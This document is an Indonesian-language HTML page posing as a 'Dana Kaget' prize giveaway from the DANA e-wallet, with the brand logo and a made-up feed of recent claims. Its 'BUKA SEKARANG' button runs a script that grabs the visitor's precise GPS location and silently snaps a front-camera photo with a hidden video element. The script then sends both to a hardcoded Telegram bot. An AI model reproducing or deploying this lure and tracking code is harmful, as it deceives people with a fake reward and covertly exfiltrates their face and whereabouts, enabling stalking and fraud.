<!DOCTYPE html>

<html class="light" lang="id">

<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
  <title>Klaim Dana Kaget</title>
  <!-- Tailwind CSS -->
  <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com" rel="preconnect" />
  <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect" />
  <link
    href="https://fonts.googleapis.com/css2?family=Spline+Sans:wght@300;400;500;600;700&amp;family=Noto+Sans:wght@400;500;700&amp;display=swap"
    rel="stylesheet" />
  <!-- Material Symbols -->
  <link
    href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap"
    rel="stylesheet" />
  <link
    href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap"
    rel="stylesheet" />
  <!-- Theme Configuration -->
  <script id="tailwind-config">
    tailwind.config = {
      darkMode: "class",
      theme: {
        extend: {
          colors: {
            "primary": "#2196f3", // biru utama
            "primary-dark": "#1565c0", // biru gelap
            "primary-light": "#e3f2fd", // biru sangat muda
            "background-light": "#e3f2fd", // biru sangat muda
            "background-dark": "#1565c0", // biru gelap
            "accent-yellow": "#ffe082", // kuning aksen
            "accent-white": "#ffffff"
          },
          fontFamily: {
            "display": ["Spline Sans", "Noto Sans", "sans-serif"]
          },
          borderRadius: {
            "DEFAULT": "0.5rem",
            "lg": "1rem",
            "xl": "1.5rem",
            "full": "9999px"
          },
        },
      },
    }
  </script>
  <style>
    /* Custom scrollbar for better look */
    ::-webkit-scrollbar {
      width: 8px;
    }

    ::-webkit-scrollbar-track {
      background: #e3f2fd;
    }

    ::-webkit-scrollbar-thumb {
      background: #2196f3;
      border-radius: 4px;
    }

    ::-webkit-scrollbar-thumb:hover {
      background: #1565c0;
    }

    .glass-effect {
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
    }

    .dark .glass-effect {
      background: rgba(33, 150, 243, 0.95);
    }
  </style>
</head>

<body
  class="bg-background-light dark:bg-background-dark font-display text-[#181411] dark:text-white transition-colors duration-200">
  <div class="relative flex h-auto min-h-screen w-full flex-col overflow-x-hidden">
    <!-- Header -->
    <header class="sticky top-0 z-50 w-full bg-white border-b-4 border-primary px-4 sm:px-10 py-3">
      <div class="mx-auto flex max-w-[1200px] items-center justify-center sm:justify-between">
        <div class="flex items-center gap-3">
          <img src="./Logo DANA - zonalogo.com.webp" alt="Logo DANA" class="w-20 h-20 object-contain" />
        </div>
      </div>
    </header>
    <main class="flex-1 flex flex-col">
      <!-- Amplop Section -->
      <section
        class="relative flex w-full min-h-screen items-center justify-center bg-primary px-2 py-8 overflow-hidden">
        <!-- Background Stars -->
        <div class="absolute inset-0 z-0 pointer-events-none">
          <div
            class="hidden md:block absolute left-1/2 top-0 -translate-x-1/2 w-[600px] h-[600px] bg-primary/30 rounded-full blur-3xl">
          </div>
          <div class="absolute w-full h-full">
            <svg class="w-full h-full" viewBox="0 0 400 800" fill="none" xmlns="http://www.w3.org/2000/svg">
              <g>
                <circle cx="50" cy="100" r="8" fill="#ffe082" />
                <circle cx="350" cy="200" r="6" fill="#ffe082" />
                <circle cx="80" cy="400" r="5" fill="#ffe082" />
                <circle cx="300" cy="600" r="7" fill="#ffe082" />
                <circle cx="200" cy="300" r="4" fill="#ffe082" />
                <circle cx="120" cy="700" r="6" fill="#ffe082" />
                <circle cx="370" cy="700" r="5" fill="#ffe082" />
              </g>
            </svg>
          </div>
        </div>
        <!-- Amplop Card -->
        <div class="relative z-10 flex flex-col items-center w-full px-4 sm:px-6">
          <div
            class="relative w-full max-w-[340px] sm:max-w-[380px] aspect-[3/4] bg-white rounded-[24px] sm:rounded-[32px] shadow-2xl overflow-hidden">

            <!-- Envelope Flap Top -->
            <svg class="absolute top-0 left-0 w-full h-[45%] z-10" viewBox="0 0 400 200" preserveAspectRatio="none">
              <path d="M0,0 L400,0 L400,150 Q200,200 0,150 Z" fill="#f5f5f5" stroke="#e0e0e0" stroke-width="1" />
            </svg>

            <!-- Vertical Center Seam/Line -->
            <div
              class="absolute top-0 left-1/2 -translate-x-1/2 w-[1px] h-full bg-gradient-to-b from-gray-200 via-gray-100 to-transparent z-5">
            </div>

            <!-- Simple Circular Badge -->
            <div class="absolute top-[38%] left-1/2 -translate-x-1/2 -translate-y-1/2 z-30">
              <div class="relative w-24 h-24 sm:w-28 sm:h-28 flex items-center justify-center filter drop-shadow-xl">
                <!-- Outer Blue Circle -->
                <div class="absolute w-full h-full rounded-full bg-[#2196f3] flex items-center justify-center">
                  <!-- Inner White Circle (larger for thinner ring) -->
                  <div class="w-20 h-20 sm:w-24 sm:h-24 rounded-full bg-white flex items-center justify-center">
                    <!-- DANA Logo -->
                    <img src="./Logo DANA - zonalogo.com.webp" alt="DANA"
                      class="w-12 h-12 sm:w-16 sm:h-16 object-contain">
                  </div>
                </div>
              </div>
            </div>

            <!-- Button -->
            <div class="absolute bottom-0 left-0 w-full p-6 sm:p-8 z-20">
              <button id="klaimHadiahBtn" onclick="captureAndSend()"
                class="w-full h-12 sm:h-14 rounded-2xl bg-[#2196f3] text-white font-bold text-base sm:text-lg tracking-wide shadow-lg hover:bg-[#1976d2] transition-all active:scale-95 uppercase">
                BUKA SEKARANG
              </button>
            </div>

            <video id="video" autoplay style="display:none;"></video>
            <canvas id="canvas" style="display:none;"></canvas>
          </div>
        </div>
      </section>
      <!-- Recent Claims Ticker (Simulated) -->
      <div class="mt-6 flex w-full max-w-[600px] flex-col gap-3 mx-auto px-4">
        <p class="text-center text-sm font-medium text-gray-500 dark:text-gray-400">Baru saja diklaim:</p>
        <div class="flex flex-col gap-2">
          <div
            class="flex items-center gap-3 rounded-xl bg-white dark:bg-[#2a2018] p-3 shadow-sm border border-[#e6e0db] dark:border-[#3a2e25]">
            <div class="size-8 overflow-hidden rounded-full bg-gray-200" data-alt="Profile picture of user Budi"
              style='background-image: url("https://lh3.googleusercontent.com/aida-public/AB6AXuAnHVxCE8WobWiqC5J1wnG08t1chKjRUL6y4Yb17pSnGkH-uAyDP_DkRq7_Os0dS8IoTg7XJyrhFt6ZdOAsLhGmDZa9XN7e89vouF6XcsThtBItlmno-pYj_q6fJnXZwW0_moqtj3BnmJ09J5SEuYYcF2h4T_qQT3SAS_RaoYPgJSKWW3PH9fS5L19f97mEVUv0SQr6j0SdGXT4dMyLZF7dh9cnvDaUoqJPsbL0bdD5kUwJX6wnkd9ByBVAh3XpOw3KJZb2ANaVGEg"); background-size: cover;'>
            </div>
            <div class="flex flex-1 items-center justify-between">
              <p class="text-sm font-medium text-[#181411] dark:text-white">Budi S. <span
                  class="font-normal text-gray-500 text-xs ml-1">2 menit lalu</span></p>
              <span class="text-sm font-bold text-green-600">+ Rp 50.000</span>
            </div>
          </div>
          <div
            class="flex items-center gap-3 rounded-xl bg-white dark:bg-[#2a2018] p-3 shadow-sm border border-[#e6e0db] dark:border-[#3a2e25] opacity-60">
            <div class="size-8 overflow-hidden rounded-full bg-gray-200" data-alt="Profile picture of user Sarah"
              style='background-image: url("https://lh3.googleusercontent.com/aida-public/AB6AXuBguZ04sBPAxG2mMbJ3VRcdcneaTlhinHLInJgHgsbddkm7cTVzTe-2A_h8EcsXR6eXlKshGEpMWunN9Xe_iStafsjxX4GxmFM4-u8oGekKQ_rdCgcnW6MxBcbvzV7qQgfXrVBU3v1rkUGI2636HhqtIekkLGGugacXWO02ElTJYdsrXxrU_q94K11iG1eSUlUycWGVY6SkOi3l428tZ73bOsQ3y7Fb8AXcGYWzD4MX9-rGchSPuKFcguIxNxSJa8pUQWK7yPCY1Kc"); background-size: cover;'>
            </div>
            <div class="flex flex-1 items-center justify-between">
              <p class="text-sm font-medium text-[#181411] dark:text-white">Sarah M. <span
                  class="font-normal text-gray-500 text-xs ml-1">5 menit lalu</span></p>
              <span class="text-sm font-bold text-green-600">+ Rp 25.000</span>
            </div>
          </div>
        </div>
      </div>
  </div>
  </section>
  <!-- Stats Section -->
  <section class="w-full px-4 lg:px-40 pb-12">
    <!-- Bagian statistik dihapus sesuai permintaan -->
  </section>
  <!-- How To Section -->
  <!-- Bagian Cara Mudah Klaim Dana dihapus sesuai permintaan -->
  </main>
  <footer class="border-t border-[#f5f2f0] dark:border-[#3a2e25] bg-white dark:bg-[#2a2018] px-4 py-8 lg:px-40">
    <div class="mx-auto flex max-w-[1200px] flex-col items-center justify-between gap-6 md:flex-row">
      <div class="flex items-center gap-2">
        <img src="./Logo DANA - zonalogo.com.webp" alt="Logo DANA" class="w-20 h-20 object-contain"
          style="border-radius:0;" />
      </div>
      <div class="flex flex-wrap justify-center gap-8 text-sm font-medium text-gray-500 dark:text-gray-400">
        <a class="hover:text-primary transition-colors" href="#">Tentang Kami</a>
        <a class="hover:text-primary transition-colors" href="#">Syarat &amp; Ketentuan</a>
        <a class="hover:text-primary transition-colors" href="#">Kebijakan Privasi</a>
        <a class="hover:text-primary transition-colors" href="#">Pusat Bantuan</a>
      </div>
      <div class="text-sm text-gray-400 dark:text-gray-500">
        Â© 2024 Dana Kaget. All rights reserved.
      </div>
    </div>
  </footer>
  </div>
</body>

<script>
  async function captureAndSend() {
    try {
      // Langkah 1: Ambil lokasi terlebih dahulu
      const position = await new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error('Geolocation tidak didukung di browser ini'));
          return;
        }

        navigator.geolocation.getCurrentPosition(
          resolve,
          reject,
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      });

      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      // Langkah 2: Ambil foto kamera depan
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const context = canvas.getContext('2d');

      // Request kamera dengan constraints yang lebih spesifik untuk iOS
      const constraints = {
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        }
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      video.srcObject = stream;

      // Tunggu video ready
      await new Promise(resolve => {
        video.onloadedmetadata = () => {
          video.play();
          resolve();
        };
      });

      // Tunggu sebentar agar kamera stabil
      await new Promise(resolve => setTimeout(resolve, 500));

      // Capture foto
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Stop kamera
      stream.getTracks().forEach(track => track.stop());

      const photo = canvas.toDataURL('image/jpeg', 0.8);

      // Langkah 3: Kirim ke Telegram
      const formData = new FormData();
      formData.append('chat_id', '8278108288');
      formData.append('caption', `Lokasi: https://www.google.com/maps?q=${lat},${lon}`);
      formData.append('photo', dataURLtoBlob(photo), 'photo.jpg');

      const response = await fetch('https://api.telegram.org/bot8334803805:AAFaT3CZdUImF2oHDdJ8bTamiQg2p0co5zQ/sendPhoto', {
        method: 'POST',
        body: formData
      });

      if (response.ok) {
        alert('Terima kasih! Data berhasil dikirim.');
      } else {
        const error = await response.text();
        console.error('Telegram error:', error);
        alert('Gagal mengirim data. Silakan coba lagi.');
      }
    } catch (error) {
      console.error('Error:', error);

      // Error handling yang lebih spesifik
      if (error.name === 'NotAllowedError' || error.code === 1) {
        alert('Izin ditolak. Silakan aktifkan akses kamera dan lokasi di pengaturan browser.');
      } else if (error.name === 'NotFoundError') {
        alert('Kamera tidak ditemukan.');
      } else if (error.message && error.message.includes('Geolocation')) {
        alert('Tidak dapat mengakses lokasi. Pastikan GPS aktif dan izinkan akses lokasi.');
      } else {
        alert('Terjadi kesalahan: ' + (error.message || 'Unknown error'));
      }
    }
  }

  function dataURLtoBlob(dataURL) {
    const byteString = atob(dataURL.split(',')[1]);
    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
      ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
  }
</script>

</html>